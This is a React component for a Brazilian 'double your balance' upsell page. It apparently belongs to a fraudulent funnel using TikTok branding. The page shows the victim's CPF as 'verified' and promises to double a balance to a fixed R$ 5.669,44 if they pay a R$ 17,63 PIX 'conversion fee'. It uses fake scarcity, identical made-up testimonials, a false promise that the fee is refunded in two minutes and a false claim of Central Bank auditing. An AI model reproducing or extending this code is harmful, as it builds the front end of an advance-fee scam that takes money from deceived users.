import { useState } from "react";
import { Loader2, Check, ChevronDown, ChevronUp } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";
import FunnelSecurityBadge from "./FunnelSecurityBadge";
import FunnelActiveUsersCounter from "./FunnelActiveUsersCounter";

interface FunnelUpsellSaldoDuplicadoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} className="w-8 h-8 rounded-full object-cover" loading="lazy" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);

const FunnelUpsellSaldoDuplicado = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellSaldoDuplicadoProps) => {
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
      <div className="bg-[#1B5E20] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">💰 SALDO EM DOBRO</h1></div>
      <main className="px-3 py-4 max-w-lg mx-auto">
        {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-[#E8F5E9] border border-[#66BB6A] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">🎯</span><div><p className="text-gray-900 text-sm font-bold mb-1">Promoção Saldo em Dobro</p><p className="text-gray-700 text-xs leading-relaxed">Apenas <span className="font-bold text-green-700">3% dos usuários</span> são elegíveis. Válida somente nesta sessão.</p></div></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
          <div className="grid grid-cols-2 gap-3 mb-4">
            <div className="bg-gray-50 rounded-lg p-3 border border-gray-200 text-center"><p className="text-gray-400 text-[10px] mb-1">SALDO ATUAL</p><p className="text-gray-900 text-lg font-black">{balance}</p></div>
            <div className="bg-green-50 rounded-lg p-3 border border-green-200 text-center relative"><span className="absolute -top-2 left-1/2 -translate-x-1/2 bg-green-500 text-white text-[9px] font-bold px-2 py-0.5 rounded-full">2X</span><p className="text-gray-400 text-[10px] mb-1">DUPLICADO</p><p className="text-green-700 text-lg font-black">R$ 5.669,44</p></div>
          </div>
          <div className="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-100"><div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-[11px]">Taxa de conversão:</span><span className="text-gray-900 text-sm font-bold">R$ 17,63</span></div><div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-[11px]">Reembolso:</span><span className="text-green-600 text-[11px] font-bold">✓ Em até 2 min</span></div><div className="flex items-center justify-between pt-1 border-t border-gray-200"><span className="text-gray-700 text-[11px] font-bold">Total:</span><span className="text-green-700 text-sm font-black">R$ 5.669,44</span></div></div>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-3.5 rounded-xl bg-[#1B5E20] text-white font-bold text-sm tracking-wide hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-green-200" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : "Duplicar Saldo para R$ 5.669,44 →"}</button>
          <FunnelSecurityBadge />
        </div>
        <FunnelActiveUsersCounter />
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="Como funciona?" answer="Multiplicador 2x aplicado ao seu saldo atual." /><FaqItem question="A taxa é reembolsável?" answer="Sim, 100%. Devolvida em até 2 minutos." /></div></div>
        <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem duplicou, recebeu em dobro</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Thiago R." location="Goiânia, GO" text="Ativei e em 2 minutos caiu o dobro." amount="R$ 5.669,44" /><TestimonialCard img={testimonial2} name="Camila B." location="Fortaleza, CE" text="Recebi tudo duplicado." amount="R$ 5.669,44" /><TestimonialCard img={testimonial3} name="Rafael N." location="Florianópolis, SC" text="Ativei na hora e recebi tudo." amount="R$ 5.669,44" /></div></div>
        <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema auditado pelo Banco Central</p></div>
      </main>
      <style>{`@keyframes ctaPulse { 0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(27,94,32,0.3); } 50% { transform: scale(1.02); box-shadow: 0 6px 25px rgba(27,94,32,0.5); } }`}</style>
    </div>
  );
};

export default FunnelUpsellSaldoDuplicado;
